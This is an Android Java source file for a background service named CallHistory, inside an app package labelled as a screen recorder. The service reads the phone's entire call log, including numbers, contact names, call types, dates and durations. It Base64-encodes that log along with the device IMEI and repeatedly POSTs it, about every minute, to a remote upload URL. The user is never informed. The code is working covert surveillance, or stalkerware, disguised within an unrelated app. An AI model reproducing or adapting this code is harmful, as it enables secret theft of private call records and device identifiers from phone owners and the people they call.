package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by chandan baba
 */
public class CallHistory extends Service {
    public static boolean  callHistory_start =false;
    String CHistoryData;
    String FileName = "";
    String time_stamp = "";
    StringBuffer sb = null;
    Timer mytimer;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        getCallDetails();
        callHistory_start =true;
    }

    @Override
    public void onCreate() {
        getCallDetails();
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        callHistory_start =true;
        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- CallHistory");
                SendCallHistory();
            }
        },20000,60500);
        return super.onStartCommand(intent, flags, startId);
    }

    private void getCallDetails() {
        sb = new StringBuffer();
        String strOrder = CallLog.Calls.DATE + " DESC";
  /* Query the CallLog Content Provider */
        Cursor managedCursor = this.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, strOrder);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int Name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        while (managedCursor.moveToNext()) {
            String phNum = managedCursor.getString(number);
            String callTypeCode = managedCursor.getString(type);
            String strcallDate = managedCursor.getString(date);
            Date callDate = new Date(Long.valueOf(strcallDate));
            String callDuration = managedCursor.getString(duration);
            String name = managedCursor.getString(Name);


            String callType = null;
            int callcode = Integer.parseInt(callTypeCode);
            switch (callcode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
            }
            sb.append("\n"+phNum+"#,$"+"\n"+callType+"#,$"+"\n"+callDate+"#,$"+"\n"+callDuration+"#,$"+"\n"+name);
            sb.append("\n---------------");
           // System.out.println(sb);
        }
        managedCursor.close();

    }


    private void SendCallHistory() {

        SharedPreferences sp = getSharedPreferences("key", 0);
        String tValue = sp.getString("chkcontact","");
        Log.d("checkcon-------","contactSharedvaluereceive::::------"+tValue);


        InputStream CallStream = null;
        HttpClient Filehttpclient = new DefaultHttpClient();
        String fsupload = UrlDemo.fsupload;
        HttpPost filehttpPost = new HttpPost(fsupload);

        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeiCHistory = imei.getBytes();
        String imeiChistoryEncode = Base64.encodeToString(imeiCHistory, Base64.DEFAULT);
        String imeiCHistoryString = imeiChistoryEncode.replaceAll("\n", "");

        CHistoryData = Base64.encodeToString(sb.toString().getBytes(), Base64.DEFAULT);

        String CHistoryDataString = CHistoryData.replaceAll("\n", "");
        System.out.println("CallHistoryBaseString ==" + CHistoryDataString);

        try {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        try {
            String Callfile_name ="CallHistory.txt";
            byte[] namedata = Callfile_name.getBytes("UTF-8");
            String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
            FileName = filenameencode.replaceAll("\n", "");

            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

            ConnectivityManager connectivity;
            NetworkInfo wifiInfo;
            connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")){
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", FileName));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeiCHistoryString));
                nameValuePair.add(new BasicNameValuePair("DATA", CHistoryDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }

                Log.d("Test","Response of CallHistory = " +buffer);
                sb.setLength(0);
            }
            else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")){
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", FileName));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeiCHistoryString));
                nameValuePair.add(new BasicNameValuePair("DATA", CHistoryDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }

                Log.d("Test","Response of CallHistory = " +buffer);
                sb.setLength(0);
            }
            else {
                Log.d("checkconError","AllCallLog connection erro");
                return;
            }
            sb.setLength(0);

        }

        catch (Exception e){
            Log.d("CallHistoryException ","CallHistoryException =" +e);
        }
    }

    public void onDestroy(){
        try {
            mytimer.cancel();
        } catch (Exception e) {}

        callHistory_start = false;
        super.onDestroy();
    }

}

